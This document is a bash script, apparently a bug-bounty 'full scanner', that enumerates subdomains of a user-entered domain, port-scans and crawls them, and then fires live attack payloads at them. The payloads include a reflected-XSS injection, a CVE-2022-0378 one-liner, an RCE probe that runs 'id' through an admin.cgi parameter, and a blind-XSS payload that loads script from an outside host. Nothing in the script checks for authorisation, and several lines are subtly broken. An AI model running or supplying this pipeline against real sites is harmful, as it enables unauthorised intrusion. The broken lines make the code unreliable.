#!/bin/bash

# Definindo cores
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sem cor

# Banner
banner(){
cat << "EOF"                
               ███╗   ███╗██████╗ ██╗  ██╗
               ████╗ ████║██╔══██╗╚██╗██╔╝
               ██╔████╔██║██████╔╝ ╚███╔╝
               ██║╚██╔╝██║██╔══██╗ ██╔██╗
               ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
               ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                    :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
%"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
EOF
echo -e "${BLUE}+ -- --=[Scanner by MRX${NC}"
echo -e "${YELLOW}+ -- --= Scanner FULL :)${NC}"
}

# Executando o banner
banner

# Verificando a entrada do domínio
read -p "Enter the domain: " domain

# Verificando se o domínio foi fornecido
if [ -z "$domain" ]; then
    echo -e "${RED}Error: Domain not provided.${NC}"
    exit 1
fi

# Carregar as variáveis do arquivo config.txt
source config.txt

# Criando pasta para o domínio
folder="$domain"
mkdir -p "$folder"

# Executando subfinder para encontrar subdomínios
echo -e "\e[33mRunning subfinder\e[0m"
subfinder -d "$domain" -all -o "$folder/subfinder_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/subfinder_tmp.txt")\e[0m"

# Executando amass para encontrar subdomínios
echo -e "\e[33mRunning amass\e[0m"
amass enum -passive -norecursive -d "$domain" -o "$folder/amass_tmp.txt"
cat "$folder/amass_tmp.txt" | oam_subs -names -d "$domain" > "$folder/amass_tmp2.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/amass_tmp2.txt")\e[0m"

# Executando Findomain
echo -e "\e[33mRunning Findomain\e[0m"
findomain -t "$domain" -q 2>/dev/null > "$folder/Findomain_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/Findomain_tmp.txt")\e[0m"

# Executando Assetfinder
echo -e "\e[33mRunning Assetfinder\e[0m"
assetfinder --subs-only "$domain" > "$folder/Assetfinder_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/Assetfinder_tmp.txt")\e[0m"

# Executando chaos
echo -e "\e[33mRunning Chaos\e[0m"
chaos -key $CHAOS_API_KEY -d "$domain" -o "$folder/chaos_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/chaos_tmp.txt")\e[0m"

#gau-subdomains
echo -e "\e[33mRunning Gau subdomains\e[0m"
gau --threads 10 --subs "$domain" | unfurl -u domains > "$folder/gau_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/gau_tmp.txt")\e[0m"

#github-subdomains verificar Api
echo -e "\e[33mRunning Github subdomains\e[0m"
github-subdomains -d "$domain" -t $GITHUB_TOKEN -o "$folder/github_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/github_tmp.txt")\e[0m"

#gitlab-subdomains verificar Api
echo -e "\e[33mRunning Gitlab subdomains\e[0m"
gitlab-subdomains -d "$domain" -t $GITLAB_TOKEN > "$folder/gitlab_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/gitlab_tmp.txt")\e[0m"

#cero-subdomains
echo -e "\e[33mRunning Cero subdomains\e[0m"
cero "$domain" > "$folder/cero_temp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/cero_temp.txt")\e[0m"

#center-subdomains
echo -e "\e[33mRunning Center subdomains\e[0m"
curl "https://api.subdomain.center/?domain=$domain" -s | jq -r '.[]' | sort -u > "$folder/center_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/center_tmp.txt")\e[0m"

# Executando Sublist3r
# colocar caminho Sublist3r
echo -e "\e[33mRunning Sublist3r\e[0m"
python3 ~/tools/Sublist3r/sublist3r.py -d "$domain" -v -o "$folder/Sublist3r_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/Sublist3r_tmp.txt")\e[0m"

# Executando jldc
echo -e "\e[33mRunning jldc\e[0m"
curl -s "https://jldc.me/anubis/subdomains/$domain" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/jldc_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/jldc_tmp.txt")\e[0m"

# Executando wayback
echo -e "\e[33mRunning wayback\e[0m"
curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$domain&output=txt&fl=original&collapse=urlkey&page=" | awk -F/ '{gsub(/:.*/, "", $3); print $3}' | sort -u > "$folder/wayback_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/wayback_tmp.txt")\e[0m"

# Executando crt
echo -e "\e[33mRunning crt\e[0m"
curl -sk "https://crt.sh/?q=%.$domain&output=json" | tr ',' '\n' | awk -F'"' '/name_value/ {gsub(/\*\./, "", $4); gsub(/\\n/,"\n",$4);print $4}' | sort -u > "$folder/crt_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/crt_tmp.txt")\e[0m"

# Executando abuseipdb
echo -e "\e[33mRunning abuseipdb\e[0m"
curl -s "https://www.abuseipdb.com/whois/$domain" -H "user-agent: firefox" -b "abuseipdb_session=" | grep -E '<li>\w.*</li>' | sed -E 's/<\/?li>//g' | sed -e "s/$/.$domain/" | sort -u > "$folder/abuseipdb_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/abuseipdb_tmp.txt")\e[0m"

# Executando alienvault
echo -e "\e[33mRunning alienvault\e[0m"
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq '.passive_dns[].hostname' 2>/dev/null | grep -o "\w.*$domain" | sort -u > "$folder/alienvault_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/alienvault_tmp.txt")\e[0m"

# Executando urlscan.io
echo -e "\e[33mRunning urlscan\e[0m"
curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" | jq '.results[].page.domain' 2>/dev/null | grep -o "\w.*$domain"| sort -u > "$folder/urlscan_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/urlscan_tmp.txt")\e[0m"

# Executando RapidDNS
echo -e "\e[33mRunning RapidDNS\e[0m"
curl -s "https://rapiddns.io/subdomain/$domain?full=1#result" | grep -v "RapidDNS" | grep -v "<td><a" | cut -d '>' -f 2 | cut -d '<' -f 1 | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/RapidDNS_tmp.txt"
# Contar as linhas do arquivo 
echo -e "\e[1;31m$(wc -l < "$folder/RapidDNS_tmp.txt")\e[0m"

# Limpando e ordenando subdomínios
echo -e "\e[33mCleaning and sorting subdomains\e[0m"
cat "$folder/subfinder_tmp.txt" "$folder/amass_tmp2.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt" > "$folder/subdomains_tmp1.txt"
sort -u "$folder/subdomains_tmp1.txt" > "$folder/subdomains.txt"
rm "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/amass_tmp2.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt"
rm "$folder/subdomains_tmp1.txt"
echo -e "\e[1;31m$(wc -l < "$folder/subdomains.txt")\e[0m"

# Executando Naabu Portas Scan
echo -e "\e[33mRunning naabu...\e[0m"
naabu -c 250 -l "$folder/subdomains.txt" -port "81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,3000,5000,8080,8000,8081,8888,8069,8009,8001,8070,8088,8002,8060,8091,8086,8010,8050,8085,8089,8040,8020,8051,8087,8071,8011,8030,8061,8072,8100,8083,8073,8099,8092,8074,8043,8035,8055,8021,8093,8022,8075,8044,8062,8023,8094,8012,8033,8063,8045,7000,9000,7070,9001,7001,10000,9002,7002,9003,7003,10001,80,443,4443" | anew "$folder/portscan.txt"
echo -e "\e[33mRunning httpx Live ports\e[0m"
httpx -l "$folder/portscan.txt" -o "$folder/liveports.txt"
rm "$folder/portscan.txt"
echo -e "\e[1;31m$(wc -l < "$folder/liveports.txt")\e[0m"

# Executando httpx para encontrar subdomínios ativos
echo -e "\e[33mFinding live subdomains...\e[0m"
httpx -l "$folder/subdomains.txt" -o "$folder/live_subdomains.txt"
echo -e "\e[1;31m$(wc -l < "$folder/live_subdomains.txt")\e[0m"

# filter subdomains by keywords
echo -e "\e[33mfilter subdomains by keywords...\e[0m"
cat "$folder/live_subdomains.txt" | egrep -i "internal|api|test|prod|private|secret|git|login|admin|staging|dev|jira|intranet|vip|portal|register|pass|reset|client|database|server|backup|Credential|database|docker|encryption|security|authorization|authentication|monitoring|logging|certificate|token|integration|endpoint|validation|configuration|deployment" > "$folder/active_priority.txt"
echo -e "\e[1;31m$(wc -l < "$folder/active_priority.txt")\e[0m"

# Extract .js Subdomains
echo -e "\e[33mExtract .js Subdomains...\e[0m"
cat "$folder/live_subdomains.txt" | getJS --complete | anew "$folder/JS.txt"
echo -e "\e[1;31m$(wc -l < "$folder/JS.txt")\e[0m"

# Executando gau para encontrar endpoints
echo -e "\e[33mFinding endpoints with gau...\e[0m"
cat "$folder/live_subdomains.txt" | gau --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg --o "$folder/EndpointsGau.txt"
echo -e "\e[1;31m$(wc -l < "$folder/EndpointsGau.txt")\e[0m"

# Executando waybackurls
echo -e "\e[33mExecutando waybackurls...\e[0m"
cat "$folder/live_subdomains.txt" | waybackurls > "$folder/EndpointsWay.txt"
echo -e "\e[1;31m$(wc -l < "$folder/EndpointsWay.txt")\e[0m"

# Executando gospider
echo -e "\e[33mExecutando gospider...\e[0m"
gospider -S "$folder/live_subdomains.txt" -o "$folder/output" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source 
cat "$folder/output/"*" | grep -e "code-200" | awk '{print $5}' | anew "$folder/EndpointsGos.txt"
rm -r "$folder/output"
echo -e "\e[1;31m$(wc -l < "$folder/EndpointsGos.txt")\e[0m"

# Executando hakrawler
echo -e "\e[33mExecutando hakrawler...\e[0m"
cat "$folder/live_subdomains.txt" | hakrawler -subs -u -t 10 | anew "$folder/EndpointsHakrawler.txt"
echo -e "\e[1;31m$(wc -l < "$folder/EndpointsHakrawler.txt")\e[0m"

# Executando cariddi
echo -e "\e[33mExecutando cariddi...\e[0m"
cat "$folder/live_subdomains.txt" | cariddi -intensive > "$folder/cariddi.txt"
echo -e "\e[1;31m$(wc -l < "$folder/cariddi.txt")\e[0m"

# Executando katana 
echo -e "\e[33mFinding endpoints with katana...\e[0m"
cat "$folder/live_subdomains.txt" | katana -silent -jc -kf all -d 3 -fs rdn -c 30 -o "$folder/Endpointskat.txt"
echo -e "\e[1;31m$(wc -l < "$folder/Endpointskat.txt")\e[0m"

# Removendo duplicatas usando uro
echo -e "\e[33mRemoving duplicats Endpoints...\e[0m"
cat "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt" "$folder/cariddi.txt" > "$folder/Endpoints1.txt"
cat "$folder/Endpoints1.txt" | uro | anew "$folder/EndpointsL.txt"
rm "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt" "$folder/cariddi.txt"
rm "$folder/Endpoints1.txt"
echo -e "\e[1;31m$(wc -l < "$folder/EndpointsL.txt")\e[0m"

# Executando Gf Patterns
echo -e "\e[32mExecutando Gf lfi...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf lfi | qsreplace "FUZZ" 2> /dev/null | anew -q "$folder/Lfi.txt"

echo -e "\e[32mExecutando Gf sqli...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf sqli | anew -q "$folder/sqli.txt"

echo -e "\e[32mExecutando Gf xss...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf xss | anew -q "$folder/xss.txt"

# Usando Gxss para enviar payloads para endpoints XSS potenciais
echo -e "\e[32mSending payloads with Gxss...\e[0m"
cat "$folder/xss.txt" | Gxss -p khXSS -o "$folder/XSS_Ref.txt"

echo -e "\e[32mExecutando Gf redirect...\e[0m"
cat "$folder/EndpointsL.txt" | gf redirect | anew -q "$folder/redirect.txt"

echo -e "\e[32mExecutando Gf rce...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf rce | anew "$folder/rce.txt"

echo -e "\e[32mExecutando Gf debug_logic...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf debug_logic | anew "$folder/debug_logic.txt"

echo -e "\e[32mExecutando Gf idor...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf idor | anew "$folder/idor.txt"

echo -e "\e[32mExecutando Gf interestingEXT...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf interestingEXT | anew "$folder/interestingEXT.txt"

echo -e "\e[32mExecutando Gf interestingparams...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf interestingparams | anew "$folder/interestingparams.txt"

echo -e "\e[32mExecutando Gf interestingsubs...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf interestingsubs | anew "$folder/interestingsubs.txt"

echo -e "\e[32mExecutando Gf ssti...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf ssti | anew "$folder/ssti.txt"

echo -e "\e[32mExecutando Gf ssrf...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf ssrf | anew "$folder/ssrf.txt"

echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"

# teste xss
echo -e "\e[32mExecutando qsreplace xss...\e[0m"
cat "$folder/xss.txt" | uro | grep "=" | qsreplace '<img src=x onerror=alert(document.domain)>' | airixss -payload "alert(document.domain)" | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
echo -e "\e[1;31m$(wc -l < "$folder/qsreplaceVul.txt")\e[0m"

# One-line test
# One-line CVE-2022-0378
echo -e "\e[32mCVE-2022-0378 One-line\e[0m"
cat "$folder/live_subdomains.txt" | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"| grep -qs "onmouse" && echo "$h: VULNERABLE - URL: $h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"; done > "$folder/CVE-2022-0378.txt"
echo -e "\e[1;31m$(wc -l < "$folder/CVE-2022-0378.txt")\e[0m"

# One-line Rce
echo -e "\e[32mRCE One-line\e[0m"
cat "$folder/live_subdomains.txt" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | grep -q "uid=" && echo "$h: VULNERABLE" > "$folder/RceOneline.txt"
echo -e "\e[1;31m$(wc -l < "$folder/RceOneline.txt")\e[0m"

# takeover vulnerabilities
# criar caminho e add o arquivo abaixo
#https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json
echo -e "\e[32mExecutando takeover Vulnerabilit\e[0m"
subjack -w "$folder/live_subdomains.txt" -t 20 -a -o "$folder/takeover.txt" -ssl
echo -e "\e[1;31m$(wc -l < "$folder/takeover.txt")\e[0m"

# openredirect
# passar caminho template open-redirect
echo -e "\e[32mExecutando open-redirect Vulnerabilit\e[0m"
cat "$folder/redirect.txt" | nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/open-redirect.yaml -o "$folder/open-redirectVUL.txt" 
echo -e "\e[1;31m$(wc -l < "$folder/open-redirectVUL.txt")\e[0m"

# crlfuzz 
echo -e "\e[32mExecutando crlfuzz Vulnerabilit\e[0m"
crlfuzz -l "$folder/live_subdomains.txt" -c 50 -s -o "$folder/crlfVul.txt"
echo -e "\e[1;31m$(wc -l < "$folder/crlfVul.txt")\e[0m"

# dalfox
echo -e "\e[32mExecutando dalfox Vulnerabilit\e[0m"
dalfox file "$folder/XSS_Ref.txt" --skip-mining-all -b '<script src=https://mrxbugcom.bxss.in></script>' -o "$folder/Vulnerable_XSS.txt"

# nuclei exposures JS
echo -e "\e[32mExecutando nuclei JS Vulnerabilit\e[0m"
cat "$folder/EndpointsL.txt" | uro | grep -iE '.js'| grep -iEv '(.jsp|.json)' | anew "$folder/js1.txt"
cat "$folder/js1.txt" "$folder/JS.txt" | anew "$folder/JS3.txt"
rm "$folder/js1.txt" "$folder/JS.txt"
nuclei -l "$folder/JS3.txt" -t ~/nuclei-templates/http/exposures/ -o "$folder/js_Vul.txt"

# nuclei
echo -e "\e[32mExecutando nuclei Vulnerabilit\e[0m"
nuclei -l "$folder/live_subdomains.txt" -severity low,medium,high,critical -o "$folder/severityNUclei.txt" -H "User-Agent:Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"

# Arquivos rápidos e suculentos com lista de palavras tomnomnom e ffuf
echo -e "\e[33mffuf Arquivos suculentos...\e[0m"
ffuf -w ~/wordlists/common-paths-tomnomnom.txt -u "https://$domain/FUZZ" -o "$folder/ffuf.txt"

echo -e "\e[34mScanner Concluído\e[0m"





